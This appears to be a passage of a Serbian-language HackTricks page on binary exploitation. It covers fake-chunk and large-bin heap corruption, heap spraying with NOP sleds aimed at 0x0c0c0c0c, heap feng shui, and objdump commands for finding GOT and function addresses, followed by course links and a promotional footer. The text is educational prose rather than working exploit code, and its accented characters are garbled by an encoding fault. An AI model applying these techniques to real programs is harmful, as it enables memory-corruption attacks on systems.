Da bi se ranjivost izvr≈°ila ≈°to je pre moguƒáe, idealno bi bilo: Rezervacija ranjivog komada, rezervacija komada koji ƒáe se modifikovati, osloboƒëenje ovog komada, rezervacija komada veƒáeg od onog koji ƒáe se modifikovati, modifikacija komada (ranjivost), rezervacija komada iste veliƒçine kao ranjivi i rezervacija drugog komada iste veliƒçine koji ƒáe pokazivati na odabranu adresu.

Za za≈°titu od ovog napada koristi se tipiƒçna provera da komad "nije" la≈æan: proverava se da li bck->fd pokazuje na ≈ærtvu. Drugim reƒçima, u na≈°em sluƒçaju, ako pokazivaƒç fd\* la≈ænog komada pokazuje na ≈ærtvu na stacku. Da bi prevazi≈°ao ovu za≈°titu, napadaƒç bi trebalo da bude sposoban da na neki naƒçin (verovatno preko stacka) upi≈°e u odgovarajuƒáu adresu adresu ≈ærtve. Tako ƒáe izgledati kao pravi komad.

**Korupcija LargeBin**

Potrebni su isti zahtevi kao i pre i jo≈° neki, osim toga, rezervisani komadi moraju biti veƒái od 512.

Napad je kao i prethodni, tj. treba promeniti pokazivaƒç bk i potrebne su sve te pozive malloc(), ali takoƒëe treba promeniti veliƒçinu modifikovanog komada tako da taj size - nb bude < MINSIZE.

Na primer, treba postaviti size na 1552 kako bi 1552 - 1544 = 8 < MINSIZE (oduzimanje ne sme biti negativno jer se uporeƒëuje sa unsigned)

Takoƒëe je uveden zakrpa da bi se to uƒçinilo jo≈° komplikovanijim.

**Raspr≈°ivanje Heap-a**

Osnovna ideja je rezervisati ≈°to je vi≈°e moguƒáe memorije za heap-ove i popuniti ih jastukom od nopsa zavr≈°enim shellcode-om. Takoƒëe, kao jastuk se koristi 0x0c. Poku≈°aƒáe se skoƒçiti na adresu 0x0c0c0c0c, pa ako se neka adresa prepi≈°e sa ovim jastukom, skoƒçiƒáe se tamo. Osnovna taktika je rezervisati ≈°to je vi≈°e moguƒáe kako bi se videlo da li je neki pokazivaƒç prekoraƒçen i skoƒçiti na 0x0c0c0c0c u nadi da ƒáe tamo biti nops.

**Feng Shui Heap-a**

Sastoji se u cementiranju memorije putem rezervacija i oslobaƒëanja kako bi se ostavili rezervisani komadi izmeƒëu slobodnih komada. Bafer za prelivanje ƒáe se nalaziti u jednom od tih komada.

**objdump -d izvr≈°iv** ‚Äî> Disas funkcije\
**objdump -d ./PROGRAMA | grep FUNKCIJA** ‚Äî> Dobijanje adrese funkcije\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Da biste videli da li je zaista na≈° shellcode i izvukli OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabela simbola, za izvlaƒçenje adrese promenljivih i funkcija\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Da biste izvukli adresu funkcija biblioteka (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Izvlaƒçi adresu puts koja ƒáe biti prepisana u GOT\
**objdump -D ./exec** ‚Äî> Disas sve do ulaza plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info o funkciji u gdb

## Interesantni kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF-u** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
